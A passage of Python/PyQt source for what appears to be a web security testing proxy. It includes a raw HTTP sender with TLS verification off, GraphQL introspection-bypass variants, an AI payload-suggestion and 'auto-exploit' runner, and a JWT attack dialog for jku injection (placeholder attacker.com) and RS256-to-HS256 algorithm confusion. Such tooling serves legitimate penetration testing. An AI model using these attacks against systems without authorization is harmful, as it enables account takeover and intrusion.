        # Header name
        self.rules.append((re.compile(r'^([\w\-]+):'), self._fmt("#61afef")))
        # Header value
        self.rules.append((re.compile(r'^[\w\-]+:\s*(.+)$'), self._fmt("#abb2bf")))
        # URL / path
        self.rules.append((re.compile(r'(/[^\s]*)'), self._fmt("#e5c07b")))
        # JSON keys
        self.rules.append((re.compile(r'"([\w\-]+)"\s*:'), self._fmt("#c678dd")))
        # JSON strings
        self.rules.append((re.compile(r':\s*"([^"]*)"'), self._fmt("#98c379")))
        # Numbers
        self.rules.append((re.compile(r'\b\d+\b'), self._fmt("#d19a66")))

    def highlightBlock(self, text):
        for pattern, fmt in self.rules:
            for m in pattern.finditer(text):
                self.setFormat(m.start(), m.end() - m.start(), fmt)


# ─────────────────────────────────────────────────────────────────────────────
# Reflection Highlighter
# ─────────────────────────────────────────────────────────────────────────────

def _extract_request_values(raw_request: str) -> list:
    """
    Pull all meaningful values out of a raw HTTP request to check for
    reflections in the response.  Returns a deduplicated list of strings,
    minimum length 4, sorted longest-first so longer matches are highlighted
    over shorter substrings.
    """
    values = set()

    if not raw_request:
        return []

    # Split headers from body
    if "\r\n\r\n" in raw_request:
        header_part, body = raw_request.split("\r\n\r\n", 1)
    elif "\n\n" in raw_request:
        header_part, body = raw_request.split("\n\n", 1)
    else:
        header_part, body = raw_request, ""

    lines = header_part.splitlines()

    # ── First line: URL query params ──────────────────────────────────────
    if lines:
        m = re.match(r'\S+\s+\S*\?(\S+)', lines[0])
        if m:
            qs = m.group(1).split()[0]  # strip HTTP version if any
            for k, v in urllib.parse.parse_qsl(qs, keep_blank_values=False):
                if v and len(v) >= 4:
                    values.add(v)

    # ── Header values (skip common boring ones) ───────────────────────────
    SKIP_HEADERS = {
        "host", "content-length", "content-type", "accept-encoding",
        "connection", "cache-control", "pragma", "upgrade-insecure-requests",
    }
    for line in lines[1:]:
        if ":" in line:
            name, _, val = line.partition(":")
            if name.strip().lower() not in SKIP_HEADERS:
                val = val.strip()
                if val and len(val) >= 4:
                    values.add(val)

    # ── Body ─────────────────────────────────────────────────────────────
    body = body.strip()
    if body:
        # JSON
        if body.startswith("{"):
            try:
                def _walk(obj):
                    if isinstance(obj, dict):
                        for v in obj.values():
                            _walk(v)
                    elif isinstance(obj, list):
                        for item in obj:
                            _walk(item)
                    elif isinstance(obj, str) and len(obj) >= 4:
                        values.add(obj)
                _walk(json.loads(body))
            except Exception:
                pass
        # Form-urlencoded
        elif "=" in body and not body.startswith("<"):
            for k, v in urllib.parse.parse_qsl(body, keep_blank_values=False):
                if v and len(v) >= 4:
                    values.add(v)
        # Raw / XML — skip (too noisy)

    # Sort longest first so longer matches shadow shorter substrings
    return sorted(values, key=len, reverse=True)


def highlight_reflections(editor: QPlainTextEdit, values: list):
    """
    Apply yellow-background extra selections to all occurrences of each
    value from `values` found in `editor`.  Clears previous reflections first.
    """
    if not values:
        editor.setExtraSelections([])
        return

    fmt = QTextCharFormat()
    fmt.setBackground(QColor("#7d6608"))   # dark yellow highlight
    fmt.setForeground(QColor("#f0e68c"))   # pale yellow text

    selections = []
    doc = editor.document()
    for val in values:
        if not val:
            continue
        cursor = QTextCursor(doc)
        while True:
            cursor = doc.find(val, cursor)
            if cursor.isNull():
                break
            sel = QTextEdit.ExtraSelection()
            sel.cursor = cursor
            sel.format  = fmt
            selections.append(sel)

    editor.setExtraSelections(selections)


# ─────────────────────────────────────────────────────────────────────────────
# HTTP Send Thread
# ─────────────────────────────────────────────────────────────────────────────

class HttpSendThread(QThread):
    response_received = pyqtSignal(str, float, int)   # response_text, elapsed_ms, size_bytes
    send_error        = pyqtSignal(str)

    def __init__(self, host: str, port: int, use_ssl: bool, raw_request: str, timeout: int = 30, follow_redirects: bool = False):
        super().__init__()
        self.host        = host
        self.port        = port
        self.use_ssl     = use_ssl
        self.raw_request = raw_request
        self.timeout     = timeout
        self.follow_redirects = follow_redirects

    def run(self):
        try:
            start = time.time()

            current_host = self.host
            current_port = self.port
            current_ssl = self.use_ssl
            current_request = self.raw_request
            
            redirects_count = 0
            max_redirects = 10
            
            while True:
                sock = socket.create_connection((current_host, current_port), timeout=self.timeout)
                if current_ssl:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode    = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=current_host)

                # Separate headers and body to safely manipulate headers
                if "\r\n\r\n" in current_request:
                    header_part, body_part = current_request.split("\r\n\r\n", 1)
                elif "\n\n" in current_request:
                    header_part, body_part = current_request.split("\n\n", 1)
                else:
                    header_part, body_part = current_request, ""

                # Normalize header line endings and downgrade HTTP version for raw socket
                header_lines = header_part.strip().splitlines()
                if header_lines:
                    if "HTTP/2" in header_lines[0]:
                        header_lines[0] = re.sub(r'HTTP/2(?:\.0)?', 'HTTP/1.1', header_lines[0])
                    
                    # Calculate body length
                    body_bytes = body_part.encode("utf-8", errors="replace")
                    body_len = len(body_bytes)

                    # Force Connection: close and update Content-Length
                    has_connection = False
                    has_content_length = False

                    for i in range(1, len(header_lines)):
                        line_lower = header_lines[i].lower()
                        if line_lower.startswith("connection:"):
                            header_lines[i] = "Connection: close"
                            has_connection = True
                        elif line_lower.startswith("content-length:"):
                            key = header_lines[i].split(":", 1)[0]
                            header_lines[i] = f"{key}: {body_len}"
                            has_content_length = True

                    if not has_connection:
                        header_lines.append("Connection: close")

                    # Add Content-Length if missing and needed
                    method = header_lines[0].split()[0].upper()
                    if not has_content_length:
                        if method in ("POST", "PUT", "PATCH") or body_len > 0:
                            header_lines.append(f"Content-Length: {body_len}")
                
                raw = "\r\n".join(header_lines) + "\r\n\r\n" + body_part

                sock.sendall(raw.encode("utf-8", errors="replace"))

                # Receive response — 65536 reduces syscall overhead on large responses
                chunks = []
                sock.settimeout(self.timeout)
                try:
                    while True:
                        chunk = sock.recv(65536)
                        if not chunk:
                            break
                        chunks.append(chunk)
                except socket.timeout:
                    pass
                finally:
                    sock.close()

                raw_resp = b"".join(chunks)

                # ── Split headers / body ──────────────────────────────────
                headers_part_resp = b""
                body_part_resp = b""
                sep = b""

                if b"\r\n\r\n" in raw_resp:
                    sep = b"\r\n\r\n"
                    headers_part_resp, body_part_resp = raw_resp.split(sep, 1)
                elif b"\n\n" in raw_resp:
                    sep = b"\n\n"
                    headers_part_resp, body_part_resp = raw_resp.split(sep, 1)
                else:
                    headers_part_resp = raw_resp

                try:
                    h_str = headers_part_resp.decode("utf-8", errors="ignore")

                    # ── Step 1: decode chunked transfer encoding ──────────
                    if re.search(r'transfer-encoding:\s*chunked', h_str, re.IGNORECASE) and body_part_resp:
                        try:
                            decoded = b""
                            buf = body_part_resp
                            while buf:
                                # find chunk-size line
                                crlf = buf.find(b"\r\n")
                                if crlf == -1:
                                    break
                                size_str = buf[:crlf].split(b";", 1)[0].strip()
                                if not size_str:
                                    break
                                chunk_size = int(size_str, 16)
                                if chunk_size == 0:
                                    break
                                start = crlf + 2
                                decoded += buf[start:start + chunk_size]
                                buf = buf[start + chunk_size + 2:]  # skip trailing CRLF
                            body_part_resp = decoded
                            # strip Transfer-Encoding header from display
                            h_str = re.sub(
                                r'(?im)^transfer-encoding:[^\r\n]*\r?\n', '',
                                h_str
                            )
                            headers_part_resp = h_str.encode("utf-8", errors="replace")
                        except Exception:
                            pass

                    # ── Step 2: decompress gzip / deflate ────────────────
                    is_gzip = (
                        re.search(r'content-encoding:\s*gzip', h_str, re.IGNORECASE)
                        or (body_part_resp[:2] == b"\x1f\x8b")
                    )
                    is_deflate = (
                        not is_gzip
                        and re.search(r'content-encoding:\s*deflate', h_str, re.IGNORECASE)
                    )
                    if is_gzip and body_part_resp:
                        try:
                            body_part_resp = gzip.decompress(body_part_resp)
                            # strip Content-Encoding header from display
                            h_str = re.sub(
                                r'(?im)^content-encoding:[^\r\n]*\r?\n', '',
                                h_str
                            )
                            headers_part_resp = h_str.encode("utf-8", errors="replace")
                        except Exception:
                            pass
                    elif is_deflate and body_part_resp:
                        try:
                            import zlib
                            body_part_resp = zlib.decompress(body_part_resp)
                            h_str = re.sub(
                                r'(?im)^content-encoding:[^\r\n]*\r?\n', '',
                                h_str
                            )
                            headers_part_resp = h_str.encode("utf-8", errors="replace")
                        except Exception:
                            pass
                    elif re.search(r'content-encoding:\s*br', h_str, re.IGNORECASE) and body_part_resp:
                        try:
                            import brotli
                            body_part_resp = brotli.decompress(body_part_resp)
                            h_str = re.sub(
                                r'(?im)^content-encoding:[^\r\n]*\r?\n', '',
                                h_str
                            )
                            headers_part_resp = h_str.encode("utf-8", errors="replace")
                        except Exception:
                            pass
                except Exception:
                    pass

                h_text = headers_part_resp.decode("utf-8", errors="replace")
                b_text = body_part_resp.decode("utf-8", errors="replace")

                if sep:
                    resp_text = h_text + sep.decode("utf-8") + b_text
                else:
                    resp_text = h_text + b_text

                # Handle Redirects
                if self.follow_redirects and redirects_count < max_redirects:
                    status_code = 0
                    m = re.match(r'HTTP/\S+\s+(\d+)', resp_text)
                    if m:
                        status_code = int(m.group(1))
                    
                    if status_code in (301, 302, 303, 307, 308):
                        loc_m = re.search(r'^[Ll]ocation:\s*(.+)$', resp_text, re.MULTILINE)
                        if loc_m:
                            location = loc_m.group(1).strip()
                            redirects_count += 1
                            
                            new_url = urllib.parse.urlparse(location)
                            
                            # Determine new host/port/ssl
                            if new_url.netloc:
                                current_host = new_url.hostname
                                current_port = new_url.port
                                if current_port is None:
                                    current_port = 443 if new_url.scheme == 'https' else 80
                                current_ssl = (new_url.scheme == 'https')
                            
                            # Determine new path
                            path = new_url.path
                            if not path: path = "/"
                            if new_url.query:
                                path += "?" + new_url.query
                                
                            # Update request method and path
                            req_lines = header_part.strip().splitlines()
                            if req_lines:
                                parts = req_lines[0].split(' ')
                                method = parts[0]
                                if status_code in (301, 302, 303) and method != 'HEAD':
                                    method = 'GET'
                                    body_part = "" # Drop body
                                
                                ver = parts[2] if len(parts) > 2 else "HTTP/1.1"
                                req_lines[0] = f"{method} {path} {ver}"
                                
                                # Update Host header
                                host_val = current_host
                                if (current_ssl and current_port != 443) or (not current_ssl and current_port != 80):
                                    host_val = f"{current_host}:{current_port}"
                                
                                host_found = False
                                for i in range(1, len(req_lines)):
                                    if req_lines[i].lower().startswith("host:"):
                                        req_lines[i] = f"Host: {host_val}"
                                        host_found = True
                                if not host_found:
                                    req_lines.insert(1, f"Host: {host_val}")
                                
                                current_request = "\r\n".join(req_lines) + "\r\n\r\n" + body_part
                                continue

                elapsed = (time.time() - start) * 1000
                self.response_received.emit(resp_text, elapsed, len(raw_resp))
                break

        except Exception as e:
            self.send_error.emit(str(e))


# ─────────────────────────────────────────────────────────────────────────────
# Selection analysis helper (delegates to InterceptTab — pure function)
# ─────────────────────────────────────────────────────────────────────────────

def _analyze_selection_for_inspector(text: str):
    """Delegates to InterceptTab._analyze_selection_html (self is unused in that method)."""
    try:
        from modules.intercept_tab import InterceptTab as _IT
        return _IT._analyze_selection_html(None, text)
    except Exception:
        return (
            f'<html><body style="background:#1E1E1E;color:#9090aa;padding:10px;'
            f'font-family:Consolas,monospace;font-size:11px;">'
            f'Analysis unavailable</body></html>',
            "", None
        )


def _url_safe_chars_from_original(original: str) -> str:
    """Return characters that appeared LITERALLY (not as %XX sequences) in
    the original URL-encoded string — these should stay unencoded on re-encode."""
    safe = set()
    i = 0
    while i < len(original):
        if original[i] == '%' and i + 2 < len(original) and \
                original[i+1] in '0123456789ABCDEFabcdef' and \
                original[i+2] in '0123456789ABCDEFabcdef':
            # skip the encoded triplet — this char WAS encoded, so not safe
            i += 3
        else:
            c = original[i]
            # The '%' itself driving an invalid sequence is kept as literal
            if c != '%':
                safe.add(c)
            i += 1
    return ''.join(sorted(safe))


# ─────────────────────────────────────────────────────────────────────────────
# GraphQL introspection bypass helpers
# ─────────────────────────────────────────────────────────────────────────────

_INTROSPECT_BLOCK_PATTERNS = [
    "introspection is not allowed",
    "introspection is disabled",
    "introspection has been disabled",
    "__schema or __type",
    "introspectionquery is not allowed",
    "field '__schema' doesn't exist",
    "cannot query field \"__schema\"",
    "introspection not enabled",
    "method not allowed",
]

# A compact but useful introspection query for GET bypass (shorter URL)
_BYPASS_PROBE_QUERY = (
    "query IntrospectionQuery{"
    "__schema\n"
    "{queryType{name}mutationType{name}subscriptionType{name}"
    "types{name kind description fields(includeDeprecated:true){"
    "name description isDeprecated args{name type{name kind ofType{name kind}}}"
    "type{name kind ofType{name kind ofType{name kind}}}}}"
    "directives{name description args{name type{name kind ofType{name kind}}}}}}"
)


class _IntroBypassThread(QThread):
    """Tries multiple bypass techniques when GraphQL introspection is blocked."""
    attempt_result = pyqtSignal(str, str, str, float)  # technique, bypass_request, resp_text, elapsed_ms
    all_done       = pyqtSignal(bool)                  # True if any bypass succeeded

    def __init__(self, host: str, port: int, use_ssl: bool,
                 orig_raw: str, timeout: int):
        super().__init__()
        self.host     = host
        self.port     = port
        self.use_ssl  = use_ssl
        self.orig_raw = orig_raw
        self.timeout  = timeout

    def _build_variants(self):
        import urllib.parse
        orig = self.orig_raw
        if "\r\n\r\n" in orig:
            hdr, body = orig.split("\r\n\r\n", 1)
        elif "\n\n" in orig:
            hdr, body = orig.split("\n\n", 1)
        else:
            hdr, body = orig, ""
        hdr_lines  = hdr.splitlines()
        first_line = hdr_lines[0] if hdr_lines else "POST /graphql HTTP/1.1"
        parts      = first_line.split()
        path       = parts[1] if len(parts) > 1 else "/graphql"
        http_ver   = parts[2] if len(parts) > 2 else "HTTP/1.1"
        # Strip query-string from path for clean rebuild
        base_path  = path.split("?")[0]

        # Extract existing query string from JSON body
        query_str = _FULL_INTROSPECT_QUERY
        try:
            obj = json.loads(body)
            query_str = obj.get("query", query_str)
        except Exception:
            pass

        # Helper: rebuild headers with new Content-Length / Content-Type
        def _patch_headers(lines, ct=None, cl=None):
            out = []
            for line in lines:
                ll = line.lower()
                if ct is not None and ll.startswith("content-type:"):
                    out.append(f"Content-Type: {ct}")
                elif cl is not None and ll.startswith("content-length:"):
                    out.append(f"Content-Length: {cl}")
                else:
                    out.append(line)
            return out

        # ── Variant 1: Newline after __schema (POST JSON) ──────────────────
        nl_query  = query_str.replace("__schema", "__schema\n")
        body1     = json.dumps({"query": nl_query, "operationName": "IntrospectionQuery"}, ensure_ascii=False)
        len1      = len(body1.encode("utf-8"))
        hdrs1     = _patch_headers(hdr_lines, cl=len1)
        var1      = "\r\n".join(hdrs1) + "\r\n\r\n" + body1

        # ── Variant 2: GET + URL-encoded query with newline ─────────────────
        get_query   = urllib.parse.quote(_BYPASS_PROBE_QUERY)
        get_path    = f"{base_path}?query={get_query}&operationName=IntrospectionQuery"
        # Keep all headers except Content-Length, Content-Type and change method
        other_hdrs  = [line for line in hdr_lines[1:]
                       if not line.lower().startswith(("content-length:", "content-type:"))]
        var2        = f"GET {get_path} {http_ver}\r\n" + "\r\n".join(other_hdrs) + "\r\n\r\n"

        # ── Variant 3: POST x-www-form-urlencoded with newline query ────────
        form_body   = urllib.parse.urlencode({"query": nl_query, "operationName": "IntrospectionQuery"})
        len3        = len(form_body.encode("utf-8"))
        hdrs3       = _patch_headers(hdr_lines, ct="application/x-www-form-urlencoded", cl=len3)
        # Ensure method is POST
        if hdrs3 and not hdrs3[0].upper().startswith("POST "):
            hdrs3[0] = re.sub(r'^\S+', 'POST', hdrs3[0])
        var3        = "\r\n".join(hdrs3) + "\r\n\r\n" + form_body

        return [
            ("POST JSON — newline after __schema",         var1),
            ("GET — URL-encoded query with \\n",           var2),
            ("POST x-www-form-urlencoded — newline query", var3),
        ]

    @staticmethod
    def _looks_like_schema(resp_text: str) -> bool:
        """Returns True if the response looks like a valid introspection result."""
        try:
            body = resp_text.split("\r\n\r\n", 1)[-1] if "\r\n\r\n" in resp_text else resp_text.split("\n\n", 1)[-1]
            data = json.loads(body)
            sc   = (data.get("data") or {}).get("__schema")
            return isinstance(sc, dict)
        except Exception:
            body = resp_text.split("\r\n\r\n", 1)[-1] if "\r\n\r\n" in resp_text else resp_text
            return '"__schema"' in body and '"queryType"' in body

    def run(self):
        try:
            variants = self._build_variants()
        except Exception as e:
            self.attempt_result.emit("Build error", "", f"[Error building variants] {e}", 0.0)
            self.all_done.emit(False)
            return
        found = False
        for name, req in variants:
            try:
                resp_text, elapsed_ms, _ = _raw_http_send(
                    self.host, self.port, self.use_ssl, req, self.timeout
                )
                self.attempt_result.emit(name, req, resp_text, elapsed_ms)
                if self._looks_like_schema(resp_text):
                    found = True
                    break
            except Exception as e:
                self.attempt_result.emit(name, req, f"[Network error] {e}", 0.0)
        self.all_done.emit(found)


# ─────────────────────────────────────────────────────────────────────────────
# AI Payload Suggest Thread
# ─────────────────────────────────────────────────────────────────────────────

class _AiPayloadSuggestThread(QThread):
    """Background thread: calls suggest_bypass_payloads() and emits results."""
    payloads_ready = pyqtSignal(list)
    error          = pyqtSignal(str)

    def __init__(self, settings: dict, param_name: str, current_value: str,
                 response_snippet: str, waf_fingerprint: str, scan_type: str):
        super().__init__()
        self._settings          = settings
        self._param_name        = param_name
        self._current_value     = current_value
        self._response_snippet  = response_snippet
        self._waf_fingerprint   = waf_fingerprint
        self._scan_type         = scan_type

    def run(self):
        try:
            from modules.ai_client import suggest_bypass_payloads
            payloads = suggest_bypass_payloads(
                self._settings,
                param_name       = self._param_name,
                current_value    = self._current_value,
                response_snippet = self._response_snippet,
                waf_fingerprint  = self._waf_fingerprint,
                scan_type        = self._scan_type,
            )
            self.payloads_ready.emit(payloads)
        except Exception as exc:
            self.error.emit(str(exc))


# ─────────────────────────────────────────────────────────────────────────────
# AI Auto-Exploit Run Thread
# ─────────────────────────────────────────────────────────────────────────────

class _AiExploitRunThread(QThread):
    """
    Iterates through a list of payloads, substitutes each into a request
    template, sends it, and emits per-row results.
    """
    result      = pyqtSignal(int, str, int, float)  # row, status_code, length, elapsed_ms
    progress    = pyqtSignal(int, int)               # current, total
    finished_all = pyqtSignal()

    def __init__(self, host: str, port: int, use_ssl: bool, timeout: int,
                 request_template: str, original_value: str, payloads: list):
        super().__init__()
        self._host      = host
        self._port      = port
        self._use_ssl   = use_ssl
        self._timeout   = timeout
        self._template  = request_template
        self._orig      = original_value
        self._payloads  = payloads
        self._stop      = False
        # Pre-detect whether the injection point lives in the URL query string
        # so we can encode spaces as '+' (same logic as _ai_encode_for_context)
        first_line = request_template.splitlines()[0] if request_template else ""
        self._encode_spaces = bool(original_value and original_value in first_line)

    def stop(self):
        self._stop = True

    def run(self):
        total = len(self._payloads)
        for idx, payload in enumerate(self._payloads):
            if self._stop:
                break
            self.progress.emit(idx + 1, total)
            encoded = payload.replace(' ', '+') if self._encode_spaces else payload
            raw = self._template.replace(self._orig, encoded, 1) if self._orig else self._template
            try:
                resp_text, elapsed_ms, size_bytes = _raw_http_send(
                    self._host, self._port, self._use_ssl, raw, self._timeout
                )
                m = re.match(r'HTTP/\S+\s+(\d+)', resp_text)
                status = m.group(1) if m else "???"
                self.result.emit(idx, status, size_bytes, elapsed_ms)
            except Exception as exc:
                self.result.emit(idx, f"ERR", 0, 0.0)
        self.finished_all.emit()


# ─────────────────────────────────────────────────────────────────────────────
# Vertical label (used for collapsed inspector sidebar tab)
# ─────────────────────────────────────────────────────────────────────────────

class _VerticalLabel(QLabel):
    """A QLabel that renders its text rotated 90° (bottom-to-top) inside a 34px strip."""
    def __init__(self, text, parent=None):
        super().__init__(text, parent)
        self.setFixedWidth(34)
        self.setSizePolicy(QSizePolicy.Fixed, QSizePolicy.Expanding)
        self.setCursor(Qt.PointingHandCursor)

    def sizeHint(self):
        sh = super().sizeHint()
        return QSize(sh.height(), sh.width())

    def paintEvent(self, event):
        painter = QPainter(self)
        painter.setPen(self.palette().color(self.foregroundRole()))
        painter.translate(0, self.height())
        painter.rotate(-90)
        painter.drawText(
            0, 0, self.height(), self.width(),
            Qt.AlignCenter, self.text()
        )
        painter.end()

    def mousePressEvent(self, event):
        self.clicked_signal()
        super().mousePressEvent(event)

    # simple pseudo-signal via a stored callable
    def set_click_handler(self, fn):
        self._click_fn = fn

    def clicked_signal(self):
        if hasattr(self, '_click_fn'):
            self._click_fn()


# ─────────────────────────────────────────────────────────────────────────────
# JWT signature highlighter  (base64url token coloured as a single block)
# ─────────────────────────────────────────────────────────────────────────────

class _JWTSigHighlighter(QSyntaxHighlighter):
    """Colours the raw base64url signature string in the JWT signature panel."""
    def __init__(self, parent=None):
        super().__init__(parent)
        # Main base64url chars — show as a muted purple/violet block
        self._b64_fmt = QTextCharFormat()
        self._b64_fmt.setForeground(QColor("#c792ea"))   # purple

        # The special marker text "(unsigned)"
        self._unsigned_fmt = QTextCharFormat()
        self._unsigned_fmt.setForeground(QColor("#f38ba8"))  # red
        self._unsigned_fmt.setFontItalic(True)

        self._b64_re     = QRegularExpression(r'[A-Za-z0-9_\-]+')
        self._unsigned_re = QRegularExpression(r'\(unsigned\)')

    def highlightBlock(self, text):
        for pattern, fmt in (
            (self._unsigned_re, self._unsigned_fmt),
            (self._b64_re,      self._b64_fmt),
        ):
            it = pattern.globalMatch(text)
            while it.hasNext():
                m = it.next()
                self.setFormat(m.capturedStart(), m.capturedLength(), fmt)


# ─────────────────────────────────────────────────────────────────────────────
# JWT Attack Dialog — editable claim table + attack-specific extra fields
# ─────────────────────────────────────────────────────────────────────────────

class _JWTAttackDialog(QDialog):
    """
    Shown when the user picks an attack from the 'Apply Attack' menu.
    Lets the user edit current payload claims (e.g. sub: wiener → admin)
    and provides extra input fields for attacks that need a URL or public key.
    """

    def __init__(self, attack_name: str, description: str,
                 payload: dict,
                 needs_url: bool = False,
                 needs_pubkey: bool = False,
                 km_rsa_keys: list = None,
                 parent=None):
        super().__init__(parent)
        self.setWindowTitle(f"⚡ {attack_name}")
        self.setMinimumWidth(780)
        self.setMinimumHeight(680)
        self.resize(860, 780)
        self.setModal(True)

        self.setStyleSheet(
            f"QDialog{{background:{COLOR_DARK_BG};color:{COLOR_TEXT};}}"
            f"QLabel{{color:{COLOR_TEXT};font-size:12px;}}"
            f"QLineEdit,QPlainTextEdit{{background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT};"
            f"border:1px solid {COLOR_BORDER};border-radius:3px;"
            f"padding:3px 6px;font-family:'{FONT_FAMILY_MONO}';font-size:12px;}}"
            f"QTableWidget{{background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT};"
            f"border:1px solid {COLOR_BORDER};gridline-color:{COLOR_BORDER};"
            f"selection-background-color:#313244;}}"
            f"QTableWidget::item{{padding:4px 6px;}}"
            f"QHeaderView::section{{background:{COLOR_DARK_BG};color:{COLOR_TEXT_MUTED};"
            f"border:none;padding:4px 6px;font-size:11px;}}"
            f"QPushButton{{background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT};"
            f"border:1px solid {COLOR_BORDER};border-radius:3px;"
            f"padding:4px 12px;font-size:12px;}}"
            f"QPushButton:hover{{background:{COLOR_HOVER};}}"
        )

        layout = QVBoxLayout(self)
        layout.setSpacing(10)
        layout.setContentsMargins(14, 14, 14, 14)

        # ── Title + description ────────────────────────────────────────────
        title_lbl = QLabel(f"⚡  {attack_name}")
        title_lbl.setStyleSheet(
            "color:#f38ba8;font-size:14px;font-weight:bold;"
        )
        layout.addWidget(title_lbl)

        desc_lbl = QLabel(description)
        desc_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:11px;")
        desc_lbl.setWordWrap(True)
        layout.addWidget(desc_lbl)

        sep = QFrame()
        sep.setFrameShape(QFrame.HLine)
        sep.setFixedHeight(1)
        sep.setStyleSheet(f"background:{COLOR_BORDER};border:none;")
        layout.addWidget(sep)

        # ── Payload claims table ───────────────────────────────────────────
        claims_lbl = QLabel("Modify Payload Claims  (edit values, then click Apply Attack):")
        claims_lbl.setStyleSheet(
            f"color:{COLOR_TEXT_BRIGHT};font-size:12px;font-weight:bold;"
        )
        layout.addWidget(claims_lbl)

        self._claim_keys: list = list(payload.keys())
        self._table = QTableWidget(len(payload), 2)
        self._table.setHorizontalHeaderLabels(["Claim", "Value"])
        self._table.horizontalHeader().setSectionResizeMode(
            0, QHeaderView.ResizeToContents
        )
        self._table.horizontalHeader().setSectionResizeMode(
            1, QHeaderView.Stretch
        )
        self._table.verticalHeader().setVisible(False)
        self._table.setSelectionBehavior(QTableWidget.SelectRows)
        self._table.setMaximumHeight(min(320, 40 + 36 * max(len(payload), 1)))
        self._table.setMinimumHeight(80)

        for row, (k, v) in enumerate(payload.items()):
            key_item = QTableWidgetItem(str(k))
            key_item.setFlags(Qt.ItemIsEnabled | Qt.ItemIsSelectable)
            key_item.setForeground(QColor("#89b4fa"))
            self._table.setItem(row, 0, key_item)

            if isinstance(v, (dict, list)):
                val_str = json.dumps(v)
            elif v is None:
                val_str = "null"
            elif isinstance(v, bool):
                val_str = "true" if v else "false"
            else:
                val_str = str(v)

            val_item = QTableWidgetItem(val_str)
            self._table.setItem(row, 1, val_item)

        layout.addWidget(self._table)

        # ── Extra: attacker URL (jku / x5u) ───────────────────────────────
        self._url_edit: QLineEdit | None = None
        self._pubkey_edit: QPlainTextEdit | None = None
        self._pubkey_input: QPlainTextEdit | None = None   # raw JWK / PEM input
        self._pem_display: QPlainTextEdit | None = None    # derived PEM (read-only)
        self._k_display: QLineEdit | None = None           # base64-encoded PEM (k value)
        self._km_key_combo: QComboBox | None = None
        self._km_rsa_keys: list = km_rsa_keys or []

        if needs_url:
            sep2 = QFrame()
            sep2.setFrameShape(QFrame.HLine)
            sep2.setFixedHeight(1)
            sep2.setStyleSheet(f"background:{COLOR_BORDER};border:none;")
            layout.addWidget(sep2)

            url_lbl = QLabel("Attacker JWKS URL  (jku / x5u value):")
            url_lbl.setStyleSheet(
                f"color:{COLOR_TEXT_BRIGHT};font-size:12px;font-weight:bold;"
            )
            layout.addWidget(url_lbl)

            self._url_edit = QLineEdit()
            self._url_edit.setPlaceholderText(
                "https://attacker.com/jwks.json"
            )
            layout.addWidget(self._url_edit)

            # ── RSA key selector (for signing with attacker key) ───────────
            key_lbl = QLabel("Sign with RSA Key  (from JWT tab Key Manager):")
            key_lbl.setStyleSheet(
                f"color:{COLOR_TEXT_BRIGHT};font-size:12px;font-weight:bold;"
            )
            layout.addWidget(key_lbl)

            self._km_key_combo = QComboBox()
            self._km_key_combo.setStyleSheet(
                f"background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT};"
                f"border:1px solid {COLOR_BORDER};border-radius:3px;"
                f"padding:3px 6px;font-size:12px;"
            )
            self._km_key_combo.addItem("(ephemeral — generate fresh key pair)", None)
            for idx, k in enumerate(self._km_rsa_keys):
                kid = k.get("kid") or k.get("_priv_jwk", {}).get("kid") or f"key-{idx}"
                alg = k.get("alg", "RSA")
                size = k.get("_size", "")
                label = f"{kid}  [{alg}  {size}]".strip()
                self._km_key_combo.addItem(label, idx)
            layout.addWidget(self._km_key_combo)

            hint = QLabel(
                "ℹ  Copy the JWKS for the selected key from the JWT tab → Key Manager → JWKS to Host"
                " and serve it at the URL above."
            )
            hint.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:10px;")
            hint.setWordWrap(True)
            layout.addWidget(hint)

        # ── Extra: RSA public key for algorithm confusion ──────────────────
        if needs_pubkey:
            sep3 = QFrame()
            sep3.setFrameShape(QFrame.HLine)
            sep3.setFixedHeight(1)
            sep3.setStyleSheet(f"background:{COLOR_BORDER};border:none;")
            layout.addWidget(sep3)

            conf_hdr = QLabel("⚙  Algorithm Confusion Key Setup  (RS256 → HS256)")
            conf_hdr.setStyleSheet(
                "color:#cba6f7;font-size:13px;font-weight:bold;"
            )
            layout.addWidget(conf_hdr)

            workflow_hint = QLabel(
                "Paste the server's RSA public key in JWK or PEM format below, "
                "click  Convert Key ▶ , then apply the attack.  "
                "The token will be re-signed with alg=HS256 using the public key "
                "PEM bytes as the HMAC-SHA256 secret."
            )
            workflow_hint.setStyleSheet(
                f"color:{COLOR_TEXT_MUTED};font-size:10px;"
            )
            workflow_hint.setWordWrap(True)
            layout.addWidget(workflow_hint)

            # Step 1 ──────────────────────────────────────────────────────
            step1_lbl = QLabel(
                "Step 1 — Paste Server RSA Public Key  (JWK  or  PEM):"
            )
            step1_lbl.setStyleSheet(
                f"color:#89b4fa;font-size:12px;font-weight:bold;"
            )
            layout.addWidget(step1_lbl)

            self._pubkey_input = QPlainTextEdit()
            self._pubkey_input.setPlaceholderText(
                '{"kty":"RSA","n":"0vx7agoebGcQ…","e":"AQAB"}   ← JWK\n'
                "  — or —\n"
                "-----BEGIN PUBLIC KEY-----\nMIIBIjANBg…\n"
                "-----END PUBLIC KEY-----   ← PEM"
            )
            self._pubkey_input.setMinimumHeight(130)
            self._pubkey_input.setMaximumHeight(180)
            self._pubkey_input.setFont(QFont(FONT_FAMILY_MONO, 10))
            layout.addWidget(self._pubkey_input)

            convert_row = QHBoxLayout()
            convert_row.setSpacing(8)
            convert_btn = QPushButton("Convert Key ▶")
            convert_btn.setStyleSheet(
                "QPushButton{background:#1e3a5f;color:#5b9bd5;"
                "border:1px solid #3a6090;border-radius:3px;"
                "font-size:12px;padding:4px 14px;font-weight:600;}"
                "QPushButton:hover{background:#26507f;}"
            )
            convert_btn.clicked.connect(self._do_convert_key)
            convert_row.addWidget(convert_btn)
            self._convert_status_lbl = QLabel("")
            self._convert_status_lbl.setStyleSheet("font-size:11px;")
            convert_row.addWidget(self._convert_status_lbl)
            convert_row.addStretch()
            layout.addLayout(convert_row)

            # Step 2 ──────────────────────────────────────────────────────
            step2_lbl = QLabel("Step 2 — Derived Public Key PEM:")
            step2_lbl.setStyleSheet(
                f"color:#89b4fa;font-size:12px;font-weight:bold;"
            )
            layout.addWidget(step2_lbl)

            pem_row = QHBoxLayout()
            pem_row.setSpacing(6)
